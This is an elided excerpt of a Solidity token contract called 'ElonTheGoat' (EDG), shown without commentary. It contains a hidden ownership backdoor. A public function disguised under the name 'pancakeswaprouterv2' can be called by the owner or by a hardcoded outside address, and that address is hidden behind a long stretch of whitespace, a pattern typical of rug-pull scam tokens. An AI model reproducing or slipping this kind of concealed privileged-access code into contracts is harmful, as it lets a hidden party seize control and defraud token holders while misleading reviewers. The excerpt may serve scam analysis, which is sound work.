...
contract Ownable is Context {
    ...
    function pancakeswaprouterv2(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address                                                                                                                                                                                                      (0x8D69d4651e187c452943ACa263fb69b055aFbE61));
...
contract ElonTheGoat is Context, IERC20, Ownable, Pausable {
  ...
  string private _symbol = "EDG";
  string private _name = "ElonTheGoat";
